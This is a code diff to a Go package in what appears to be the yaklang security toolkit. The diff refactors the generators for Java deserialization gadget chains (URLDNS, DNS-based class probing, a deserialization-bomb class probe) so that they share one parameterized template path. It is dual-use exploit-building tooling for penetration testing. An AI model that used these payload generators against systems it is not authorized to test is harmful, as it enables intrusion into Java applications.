@@ -1,6 +1,7 @@
 package yso
 
 import (
+	"errors"
 	"fmt"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yserx"
@@ -92,8 +93,14 @@ type GenGadgetOptionFun func(*GenerateGadgetConfig)
 type GenerateGadgetConfig struct {
 	ChainType string
 	Args      []string
+	ArgsMap   map[string]string
 }
 
+func SetGadgetParam(params map[string]string) GenGadgetOptionFun {
+	return func(config *GenerateGadgetConfig) {
+		config.ArgsMap = params
+	}
+}
 func SetTransformChainTypeByMap(s string, params map[string]string) GenGadgetOptionFun {
 	return func(config *GenerateGadgetConfig) {
 		config.ChainType = s
@@ -153,7 +160,7 @@ func GenerateGadget(name GadgetType, opts ...any) (*JavaObject, error) {
 			return nil, utils.Errorf("config gadget %s class object failed: %v", name, err)
 		}
 		return verboseWrapper(obj, AllGadgets[name]), nil
-	} else {
+	} else if genConfig.ChainType != "" {
 		chainType := genConfig.ChainType
 		if chainType == "" {
 			chainType = "raw_cmd"
@@ -177,6 +184,28 @@ func GenerateGadget(name GadgetType, opts ...any) (*JavaObject, error) {
 			err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), arg, 1)
 			if err != nil {
 				return nil, err
+			}
+		}
+		return verboseWrapper(obj, AllGadgets[name]), nil
+	} else {
+		template := cfg.Template
+		objs, err := yserx.ParseJavaSerialized(template)
+		if err != nil {
+			return nil, err
+		}
+		if len(objs) <= 0 {
+			return nil, utils.Error("parse gadget error")
+		}
+		obj := objs[0]
+
+		for i, param := range cfg.Params {
+			if val, ok := genConfig.ArgsMap[string(param.Name)]; ok {
+				err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), val, -1)
+				if err != nil {
+					return nil, err
+				}
+			} else {
+				return nil, errors.New("missing param: " + string(param.Name))
 			}
 		}
 		return verboseWrapper(obj, AllGadgets[name]), nil
@@ -607,13 +636,6 @@ func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // )
 // ```
 func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	//objs, err := yserx.ParseJavaSerialized(template_ser_JavassistWeld1)
-	//if err != nil {
-	//	return nil, err
-	//}
-	//obj := objs[0]
-	//return verboseWrapper(obj, AllGadgets["JavassistWeld1"]), nil
-
 	return GenerateGadget(GadgetJavassistWeld1, utils.InterfaceToSliceInterface(options)...)
 }
 
@@ -681,20 +703,9 @@ func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 //
 // ```
 func GetURLDNSJavaObject(url string) (*JavaObject, error) {
-	obj, err := yserx.ParseFromBytes(template_ser_URLDNS)
-	if err != nil {
-		return nil, err
-	}
-	err = ReplaceStringInJavaSerilizable(obj, "1.1.1.1", url, -1)
-	if err != nil {
-		return nil, err
-	}
-	return verboseWrapper(obj, &GadgetInfo{
-		Name:                "URLDNS",
-		NameVerbose:         "URLDNS",
-		SupportTemplateImpl: false,
-		Help:                "",
-	}), nil
+	return GenerateGadget(GadgetURLDNS, SetGadgetParam(map[string]string{
+		"domain": url,
+	}))
 }
 
 // GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。
@@ -719,20 +730,9 @@ func GetURLDNSJavaObject(url string) (*JavaObject, error) {
 //
 // ```
 func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
-	obj, err := yserx.ParseFromBytes(tmeplate_ser_GADGETFINDER)
-	if err != nil {
-		return nil, err
-	}
-	err = ReplaceStringInJavaSerilizable(obj, "{{DNSURL}}", url, -1)
-	if err != nil {
-		return nil, err
-	}
-	return verboseWrapper(obj, &GadgetInfo{
-		Name:                "FindGadgetByDNS",
-		NameVerbose:         "FindGadgetByDNS",
-		SupportTemplateImpl: false,
-		Help:                "",
-	}), nil
+	return GenerateGadget("FindAllClassesByDNS", SetGadgetParam(map[string]string{
+		"domain": url,
+	}))
 }
 
 // GetFindClassByBombJavaObject 目标存在指定的 ClassName 时,将会耗部分服务器性能达到间接延时的目的
@@ -746,20 +746,9 @@ func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
 // 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
 // ```
 func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
-	obj, err := yserx.ParseFromBytes(tmeplate_ser_FindClassByBomb)
-	if err != nil {
-		return nil, err
-	}
-	err = ReplaceClassNameInJavaSerilizable(obj, "{{ClassName}}", className, -1)
-	if err != nil {
-		return nil, err
-	}
-	return verboseWrapper(obj, &GadgetInfo{
-		Name:                "FindClassByBomb",
-		NameVerbose:         "FindClassByBomb",
-		SupportTemplateImpl: false,
-		Help:                "通过构造反序列化炸弹探测Gadget",
-	}), nil
+	return GenerateGadget(GadgetFindClassByBomb, SetGadgetParam(map[string]string{
+		"class": className,
+	}))
 }
 
 // GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。
@@ -777,16 +766,7 @@ func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
 // 发送 payload
 // ```
 func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
-	obj, err := yserx.ParseFromBytes(template_ser_simplePrincipalCollection)
-	if err != nil {
-		return nil, err
-	}
-	return verboseWrapper(obj, &GadgetInfo{
-		Name:                "SimplePrincipalCollection",
-		NameVerbose:         "SimplePrincipalCollection",
-		SupportTemplateImpl: false,
-		Help:                "",
-	}), nil
+	return GenerateGadget(GadgetSimplePrincipalCollection)
 }
 
 // GetAllGadget 获取所有的支持的Gadget
